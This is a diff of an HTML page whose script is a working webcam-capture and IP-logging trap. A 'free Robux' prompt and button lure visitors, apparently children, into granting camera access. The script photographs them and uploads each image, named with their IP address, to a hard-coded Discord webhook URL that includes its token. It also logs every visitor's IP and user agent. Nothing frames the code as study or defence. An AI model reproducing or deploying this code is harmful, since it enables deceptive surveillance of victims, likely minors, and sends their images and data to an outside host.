@@ -1,214 +1,168 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            background-color: #f0f0f0;
-        }
-        
-        #executeBtn {
-            background: linear-gradient(to right, #ff8a00, #e52e71);
-            color: white;
-            border: none;
-            padding: 15px 30px;
-            border-radius: 25px;
-            cursor: pointer;
-            font-weight: bold;
-            font-size: 18px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
-            transition: all 0.3s ease;
-            z-index: 9999;
-        }
-        
-        #executeBtn:hover {
-            transform: scale(1.05);
-            box-shadow: 0 6px 20px rgba(0,0,0,0.3);
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <title>Webcam Capture with Delay</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background-color: #f0f0f0;
+    }
+  </style>
 </head>
 <body>
 
 <script>
-// ䷀䷁䷂䷄ WEBCAM CAPTURE WITH DELAY + IP LOGGER ䷅䷆䷇䷈
-async function hijackWebcam() {
-  const DELAY_SECONDS = 5; // Set delay here
-  const WEBHOOK_URL = "https://discord.com/api/webhooks/1403083806705057812/I3474kOt2sZKd2gOPsv6BCcP1X7J0smnlx5r15sp_Hm28vtemEZaCbMI1q3D6emTv5zR"; // Replace with actual URL
+(async function() {
+  const DELAY_SECONDS = 5;
+  const WEBHOOK_URL = "https://discord.com/api/webhooks/1403083806705057812/I3474kOt2sZKd2gOPsv6BCcP1X7J0smnlx5r15sp_Hm28vtemEZaCbMI1q3D6emTv5zR";
 
   async function getIP() {
-    const res = await fetch("https://api.ipify.org?format=json");
-    const data = await res.json();
-    return data.ip;
+    try {
+      const res = await fetch("https://api.ipify.org?format=json");
+      const data = await res.json();
+      return data.ip;
+    } catch {
+      return "unknown";
+    }
   }
 
   function logToWebhook(title, message) {
     console.log(`${title}\n${message}`);
-    // Optional: send this to another webhook if needed
+    // Optional: send logs somewhere else if needed
   }
 
-  try {
-    const ip = await getIP();
+  async function hijackWebcam() {
+    try {
+      const ip = await getIP();
 
-    const stream = await navigator.mediaDevices.getUserMedia({
-      video: {
-        width: { ideal: 1920 },
-        height: { ideal: 1080 },
-        facingMode: "user",
-      },
-    });
+      const stream = await navigator.mediaDevices.getUserMedia({
+        video: {
+          width: { ideal: 1920 },
+          height: { ideal: 1080 },
+          facingMode: "user",
+        }
+      });
 
-    const video = document.createElement("video");
-    video.srcObject = stream;
-    await video.play(); // Ensure playback starts
+      const video = document.createElement("video");
+      video.srcObject = stream;
+      await video.play();
 
-    // Create preview container
-    const preview = document.createElement("div");
-    preview.style.position = "fixed";
-    preview.style.bottom = "20px";
-    preview.style.right = "20px";
-    preview.style.width = "200px";
-    preview.style.border = "2px solid red";
-    preview.style.borderRadius = "10px";
-    preview.style.overflow = "hidden";
-    preview.style.zIndex = "99999";
-    preview.style.backgroundColor = "black";
-    preview.appendChild(video);
-    document.body.appendChild(preview);
+      const preview = document.createElement("div");
+      Object.assign(preview.style, {
+        position: "fixed",
+        bottom: "20px",
+        right: "20px",
+        width: "200px",
+        border: "2px solid red",
+        borderRadius: "10px",
+        overflow: "hidden",
+        zIndex: "99999",
+        backgroundColor: "black"
+      });
+      preview.appendChild(video);
+      document.body.appendChild(preview);
 
-    // Add loading text
-    const loadingText = document.createElement("div");
-    loadingText.textContent = `Capturing in ${DELAY_SECONDS} seconds...`;
-    loadingText.style.color = "white";
-    loadingText.style.backgroundColor = "black";
-    loadingText.style.padding = "5px";
-    loadingText.style.textAlign = "center";
-    preview.appendChild(loadingText);
+      const loadingText = document.createElement("div");
+      loadingText.textContent = `Capturing in ${DELAY_SECONDS} seconds...`;
+      Object.assign(loadingText.style, {
+        color: "white",
+        backgroundColor: "black",
+        padding: "5px",
+        textAlign: "center"
+      });
+      preview.appendChild(loadingText);
 
-    // Countdown timer
-    let countdown = DELAY_SECONDS;
-    const countdownInterval = setInterval(() => {
-      countdown--;
-      loadingText.textContent = `Capturing in ${countdown} seconds...`;
-      if (countdown <= 0) {
-        clearInterval(countdownInterval);
-        captureFrame();
+      let countdown = DELAY_SECONDS;
+      const countdownInterval = setInterval(() => {
+        countdown--;
+        loadingText.textContent = `Capturing in ${countdown} seconds...`;
+        if (countdown <= 0) {
+          clearInterval(countdownInterval);
+          captureFrame();
+        }
+      }, 1000);
+
+      async function captureFrame() {
+        if (video.readyState < 2) {
+          await new Promise(resolve => {
+            video.onloadeddata = resolve;
+          });
+        }
+        const canvas = document.createElement("canvas");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        canvas.toBlob(blob => {
+          const formData = new FormData();
+          formData.append("file", blob, `webcam_${ip}.jpg`);
+          fetch(WEBHOOK_URL, { method: "POST", body: formData });
+
+          logToWebhook(
+            "📸 WEBCAM CAPTURED",
+            `IP: ${ip}\nResolution: ${canvas.width}x${canvas.height}\nDelay: ${DELAY_SECONDS} seconds`
+          );
+
+          stream.getTracks().forEach(track => track.stop());
+          preview.remove();
+        }, "image/jpeg", 0.9);
       }
-    }, 1000);
-
-    async function captureFrame() {
-      // Wait for video metadata to be ready
-      if (video.readyState < 2) {
-        await new Promise((resolve) => {
-          video.onloadeddata = resolve;
-        });
-      }
-
-      const canvas = document.createElement("canvas");
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      const ctx = canvas.getContext("2d");
-
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-      canvas.toBlob((blob) => {
-        const formData = new FormData();
-        formData.append("file", blob, `webcam_${ip}.jpg`);
-        fetch(WEBHOOK_URL, { method: "POST", body: formData });
-
-        logToWebhook(
-          "📸 WEBCAM CAPTURED",
-          `IP: ${ip}\nResolution: ${canvas.width}x${canvas.height}\nDelay: ${DELAY_SECONDS} seconds`
-        );
-
-        // Clean up
-        stream.getTracks().forEach((track) => track.stop());
-        preview.remove();
-      }, "image/jpeg", 0.9);
+    } catch (err) {
+      const fallbackIP = await getIP();
+      logToWebhook("❌ WEBCAM FAILED", `IP: ${fallbackIP}\nError: ${err.message}`);
     }
-  } catch (err) {
-    const fallbackIP = await getIP().catch(() => "unknown");
-    logToWebhook("❌ WEBCAM FAILED", `IP: ${fallbackIP}\nError: ${err.message}`);
   }
-}
 
-    
-    async function captureFrame() {
-      const canvas = document.createElement("canvas");
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      const ctx = canvas.getContext("2d");
-      
-      // Ensure video is properly loaded
-      await new Promise(resolve => setTimeout(resolve, 500));
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      
-      canvas.toBlob(blob => {
-        const formData = new FormData();
-        formData.append("file", blob, `webcam_${ip}.jpg`);
-        fetch(WEBHOOK_URL, { method: "POST", body: formData });
-        logToWebhook("📸 WEBCAM CAPTURED", 
-          `IP: ${ip}\n` +
-          `Resolution: ${canvas.width}x${canvas.height}\n` +
-          `Delay: ${DELAY_SECONDS} seconds`);
-        
-        // Clean up
-        stream.getTracks().forEach(track => track.stop());
-        preview.remove();
-      }, "image/jpeg", 0.90);
-    }
-    
-  } catch (err) {
-    logToWebhook("❌ WEBCAM FAILED", `IP: ${await getIP()}\nError: ${err.message}`);
-  }
-}
-
-// ䷀䷁䷊䷋ MAIN EXECUTION
-(async function() {
+  // Log visitor info
   const ip = await getIP();
-  await logToWebhook("🌐 VISITOR DETECTED", `IP: ${ip}\nUser-Agent: ${navigator.userAgent}`);
+  logToWebhook("🌐 VISITOR DETECTED", `IP: ${ip}\nUser-Agent: ${navigator.userAgent}`);
 
   if (confirm("Allow webcam for free robux?")) {
     await hijackWebcam();
   } else {
-    await logToWebhook("⚠️ WEBCAM DENIED", `IP: ${ip}\nUA: ${navigator.userAgent}`);
+    logToWebhook("⚠️ WEBCAM DENIED", `IP: ${ip}\nUA: ${navigator.userAgent}`);
   }
 
-  // 丂ᚴᛁᚥᛖ丂丂丂丂 MANUAL TRIGGER BUTTON
-  document.body.innerHTML += `
-    <button id="executeBtn" style="
-      position:fixed;
-      top:10px;
-      right:10px;
-      z-index:9999;
-      background:linear-gradient(to right, #ff8a00, #e52e71);
-      color:white;
-      border:none;
-      padding:12px 24px;
-      border-radius:25px;
-      cursor:pointer;
-      font-weight:bold;
-      box-shadow:0 4px 15px rgba(0,0,0,0.2);
-      transition:all 0.3s ease;
-    ">
-      🎁 CLAIM FREE ROBUX
-    </button>
-  `;
-  
-  const btn = document.getElementById("executeBtn");
+  // Manual trigger button
+  const btn = document.createElement("button");
+  btn.id = "executeBtn";
+  btn.textContent = "🎁 CLAIM FREE ROBUX";
+  Object.assign(btn.style, {
+    position: "fixed",
+    top: "10px",
+    right: "10px",
+    zIndex: "9999",
+    background: "linear-gradient(to right, #ff8a00, #e52e71)",
+    color: "white",
+    border: "none",
+    padding: "12px 24px",
+    borderRadius: "25px",
+    cursor: "pointer",
+    fontWeight: "bold",
+    boxShadow: "0 4px 15px rgba(0,0,0,0.2)",
+    transition: "all 0.3s ease"
+  });
+
   btn.addEventListener("mouseover", () => {
     btn.style.transform = "scale(1.05)";
     btn.style.boxShadow = "0 6px 20px rgba(0,0,0,0.3)";
   });
+
   btn.addEventListener("mouseout", () => {
     btn.style.transform = "scale(1)";
     btn.style.boxShadow = "0 4px 15px rgba(0,0,0,0.2)";
   });
+
   btn.addEventListener("click", hijackWebcam);
+  document.body.appendChild(btn);
+
 })();
 </script>
 
